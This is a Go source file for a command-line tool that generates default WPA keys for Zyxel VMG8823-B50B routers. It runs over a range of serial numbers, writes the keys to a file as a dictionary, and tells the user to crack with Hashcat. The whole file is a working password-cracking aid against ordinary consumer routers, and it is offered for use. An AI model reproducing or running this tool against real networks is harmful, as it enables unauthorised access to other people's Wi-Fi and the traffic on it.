package main
 
import (
    "fmt"
    "os"
    "strconv"
 
    docopt "github.com/docopt/docopt.go"
    "github.com/luc10/zykgen"
)
 
func replaceAtIndex(in string, r rune, i int) string {
    out := []rune(in)
    out[i] = r
    return string(out)
}
 
const usage = `Zyxel VMG8823-B50B WPA Keygen
 
Usage:
  zykgen (-m|-n|-c) [-l <length> -L <letter>] <startserial> <endserial>
  zykgen -h | --help
 
Options:
  -l <length>     Output key length [default: 10].
  -L <letter>     Fifth letter of the serial [default: V].
  -h --help       Show this screen.`
 
func main() {
    var cocktail zykgen.Cocktail
    var seriale string
 
    var args struct {
        Sserial string `docopt:"<startserial>"`
        Eserial string `docopt:"<endserial>"`
 
        Letter       string `docopt:"-L"`
        Length       int    `docopt:"-l"`
        Mojito       bool   `docopt:"-m"`
        Negroni      bool   `docopt:"-n"`
        Cosmopolitan bool   `docopt:"-c"`
    }
 
    opts, err := docopt.DefaultParser.ParseArgs(usage, os.Args[1:], "")
    if err != nil {
        return
    }
 
    opts.Bind(&args)
    if args.Mojito {
        cocktail = zykgen.Mojito
    }
    if args.Negroni {
        cocktail = zykgen.Negroni
    }
    if args.Cosmopolitan {
        cocktail = zykgen.Cosmopolitan
    }
 
    start, err := strconv.Atoi(args.Sserial)
    if err != nil {
        fmt.Println(err)
        fmt.Println("Serial number should be 12 chars long, (exluding the first char which is 'S'),should contain only numbers, letter 'V' is automatically added")
        return
    }
 
    end, err := strconv.Atoi(args.Eserial)
    if err != nil {
        fmt.Println(err)
        fmt.Println("Serial number should be 12 chars long, (exluding the first char which is 'S'),should contain only numbers, letter 'V' is automatically added")
        return
    }
 
    if start > end {
        fmt.Println("End of the serial should be at least > start of the serial")
        return
    }
 
    if len(args.Sserial) != 12 {
        fmt.Println("Serial number should be 12 chars long, (exluding the first char which is 'S'),should contain only numbers, letter 'V' is automatically added ")
        return
    }
 
    if len(args.Eserial) != 12 {
        fmt.Println("Serial number should be 12 chars long, (exluding the first char which is 'S'),should contain only numbers, letter 'V' is automatically added  ")
        return
    }
 
    f, err := os.Create("wpa_keys_" + args.Sserial + "_" + args.Eserial + "_" + strconv.Itoa(args.Length) + "_" + args.Letter + "_c.txt")
    if err != nil {
        fmt.Println(err)
        return
    }
 
    for i := start; i < end; i++ {
 
        seriale = fmt.Sprintf("%12d", i)
        seriale = "S" + replaceAtIndex(seriale, []rune(args.Letter)[0], 3)
        _, err := f.WriteString((zykgen.Wpa(seriale, args.Length, cocktail) + "\n"))
        if err != nil {
            fmt.Println(err)
            f.Close()
            return
        }
 
    }
 
    fmt.Println("Dictionary of keys was created on the root directory!, now use Hashcat.")
 
    err = f.Close()
    if err != nil {
        fmt.Println(err)
        return
    }
 
}
